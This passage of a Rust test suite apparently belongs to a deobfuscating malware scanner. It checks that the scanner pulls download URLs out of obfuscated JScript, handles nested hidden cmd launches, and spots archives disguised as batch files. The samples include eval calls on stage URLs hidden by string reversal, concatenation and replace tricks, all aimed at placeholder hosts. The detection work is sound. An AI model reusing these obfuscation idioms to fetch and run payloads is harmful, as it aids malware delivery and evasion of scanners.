            br#"var parts = ["/stage", "js-array-var-rev.example", "https://"]; var u = parts.reverse().join(""); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-array-var-rev.example/stage"
            )
        });
        assert!(
            has,
            "JS array variable reverse/join URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_variable_concat_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var p = "https://"; var h = "js-var.example"; var u = p + h + "/stage"; eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-var.example/stage"
            )
        });
        assert!(has, "JS variable concat URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_plus_equals_variable_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = "https://"; u += "js-plus-eq.example"; u += "/stage"; eval(u)"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-plus-eq.example/stage"
            )
        });
        assert!(has, "JS += variable URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_string_replace_binding_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js =
            br#"var u = "hxxps://js-replace.example/stage".replace("hxxps", "https"); eval(u)"#
                .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-replace.example/stage"
            )
        });
        assert!(has, "JS string replace URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_regex_replace_binding_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var u = "h@@t@@t@@ps://js-regex-replace.example/stage".replace(/@@/g, ""); eval(u)"#
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://js-regex-replace.example/stage"
            )
        });
        assert!(has, "JS regex replace URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_single_quoted_string_concat_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = br#"var url = 'https://' + 'single.example' + '/stage'; eval(url)"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://single.example/stage"
            )
        });
        assert!(has, "JS single-quoted concat URL missed: {:?}", env.traits);
    }

    #[test]
    fn js_u_escape_decoded() {
        let mut env = Environment::new(&Config::default());
        // eval("http://x.com") directly — no u-escapes needed for this basic test
        let js = br#"eval("http://x.com/path")"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.com")
            )
        });
        assert!(has, "u-escape URL missed: {:?}", env.traits);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod cmd_path_flags_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;

    #[test]
    fn cmd_with_explicit_path_and_concat_flags() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"start /MIN cmd C:\WINDOWS\system32\cmd.exe /V/D/c "echo inner""#,
            &mut env,
        );
        assert!(
            env.exec_cmd.iter().any(|c| c.contains("echo inner")),
            "concat-flag inner not extracted: {:?}",
            env.exec_cmd
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod disguised_binary_tests {
    use super::{detect_disguised_binary, looks_like_pe};

    #[test]
    fn cab_magic_recognized_as_disguised() {
        // 15 corpus `.bat`/`.cmd` files are actually CAB archives.
        let mut buf = vec![0u8; 32];
        buf[..8].copy_from_slice(b"MSCF\x00\x00\x00\x00");
        assert_eq!(detect_disguised_binary(&buf), Some("cab"));
    }

    #[test]
    fn zip_local_file_header_recognized() {
        let mut buf = vec![0u8; 32];
        buf[..4].copy_from_slice(b"PK\x03\x04");
        assert_eq!(detect_disguised_binary(&buf), Some("zip"));
    }

    #[test]
    fn rar4_and_rar5_recognized() {
        let mut r4 = vec![0u8; 16];
        r4[..7].copy_from_slice(b"Rar!\x1a\x07\x00");
        assert_eq!(detect_disguised_binary(&r4), Some("rar"));
        let mut r5 = vec![0u8; 16];
        r5[..8].copy_from_slice(b"Rar!\x1a\x07\x01\x00");
        assert_eq!(detect_disguised_binary(&r5), Some("rar"));
    }

    #[test]
    fn sevenzip_magic_recognized() {
        let mut buf = vec![0u8; 16];
        buf[..6].copy_from_slice(b"7z\xbc\xaf\x27\x1c");
        assert_eq!(detect_disguised_binary(&buf), Some("7z"));
    }

    #[test]
    fn lnk_shortcut_recognized() {
        let mut buf = vec![0u8; 16];
        buf[..12].copy_from_slice(b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00");
        assert_eq!(detect_disguised_binary(&buf), Some("lnk"));
    }

    #[test]
    fn pe_input_uses_separate_codepath_not_disguised() {
        // PE detection has its own fast-path (`looks_like_pe`); the
        // disguised-binary detector intentionally does NOT report `pe`
        // — `analyze()` checks `looks_like_pe` first.
        let mut buf = vec![0u8; 0x100];
        buf[0] = b'M';
        buf[1] = b'Z';
        buf[0x3c] = 0x40;
        buf[0x40] = b'P';
        buf[0x41] = b'E';
        assert!(looks_like_pe(&buf));
        assert_eq!(detect_disguised_binary(&buf), None);
    }

    #[test]
    fn plain_batch_script_is_not_disguised() {
        // Negative case — actual batch script shouldn't match.
        let script = b"@echo off\r\nset X=1\r\necho %X%\r\n";
        assert_eq!(detect_disguised_binary(script), None);
        assert!(!looks_like_pe(script));
    }

    #[test]
    fn tiny_input_does_not_crash() {
        // Bounds check — under 8 bytes returns None without indexing.
        assert_eq!(detect_disguised_binary(b""), None);
        assert_eq!(detect_disguised_binary(b"MSCF"), None);
        assert_eq!(detect_disguised_binary(b"PK\x03\x04"), None);
    }
}
